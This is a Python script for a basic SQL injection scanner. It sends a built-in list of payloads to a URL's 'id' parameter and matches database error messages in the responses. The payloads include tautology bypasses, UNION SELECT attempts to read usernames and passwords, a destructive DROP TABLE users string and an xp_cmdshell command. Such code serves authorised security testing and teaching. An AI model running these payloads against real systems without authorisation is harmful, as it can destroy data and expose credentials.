import requests

class SQLInjectionTest:
    def __init__(self, param_name, payload, error_messages):
        """
        Initialize the SQLInjectionTest object.

        Parameters
        ----------
        param_name : str
            The name of the parameter to test.
        payload : str
            The SQL injection payload to use.
        error_messages : list
            A list of common SQL error messages to detect.
        """
        self.param_name = param_name
        self.payload = payload
        self.error_messages = error_messages

    def run_test(self, base_url):
        """
        Run the SQL injection test.

        Parameters
        ----------
        base_url : str
            The base URL of the website to test.

        Returns
        -------
        bool
            True if the parameter is likely vulnerable, False otherwise.
        """
        print(f"Testing {self.param_name} for SQL injection with payload: {self.payload}")
        vulnerable = False
        target_url = f"{base_url}?{self.param_name}={self.payload}"
        print(f"Requesting URL: {target_url}")
        response = requests.get(target_url)

        for error in self.error_messages:
            if error.lower() in response.text.lower():
                print(f"Potential SQL Injection Vulnerability found with payload: {self.payload}")
                vulnerable = True
                break

        if not vulnerable:
            print(f"No SQL Injection vulnerability detected with payload: {self.payload}")

        return vulnerable


class SecurityTester:
    def __init__(self, base_url):
        """
        Initialize the SecurityTester object.

        Parameters
        ----------
        base_url : str
            The base URL of the website to test.
        """
        self.base_url = base_url
        self.error_messages = [
            "you have an error in your sql syntax;",
            "unclosed quotation mark after the character string",
            "warning: mysql",
            "ORA-00933",  # Oracle SQL error
            "SQLSTATE[42000]",  # MySQL SQL error
            "syntax error",  # Generic SQL syntax error
            "Microsoft OLE DB Provider for SQL Server"  # MS SQL Server error
        ]
        self.sql_payloads = [
            "' OR '1'='1",  # Classic SQL Injection
            "' OR '1'='1' --",  # SQL Injection with comment
            "' OR '1'='1' /*",  # SQL Injection with block comment
            "'; DROP TABLE users; --",  # Destructive SQL Injection
            "' UNION SELECT * FROM users --",  # Attempt to select all data from a table
            "' UNION SELECT * FROM information_schema.tables --",  # Attempt to retrieve table names
            "' UNION SELECT username, password FROM users --",  # Attempt to retrieve specific columns
            "' AND 1=1 --",  # SQL Injection with tautology
            "' AND 1=2 --",  # SQL Injection with contradiction
            "'; EXEC xp_cmdshell('dir'); --",  # SQL Server command execution
        ]

    def add_custom_payload(self, payload):
        """
        Add a custom SQL injection payload to the test suite.

        Parameters
        ----------
        payload : str
            The custom SQL injection payload to add.
        """
        self.sql_payloads.append(payload)

    def run_all_tests(self):
        """
        Run all SQL injection tests.
        """
        for payload in self.sql_payloads:
            test = SQLInjectionTest(param_name="id", payload=payload, error_messages=self.error_messages)
            test.run_test(self.base_url)


# EXAMPLE USAGE
if __name__ == "__main__":
    # Replace 'http://example.com/page' with the actual URL to test
    tester = SecurityTester("http://example.com/page")
    tester.run_all_tests()
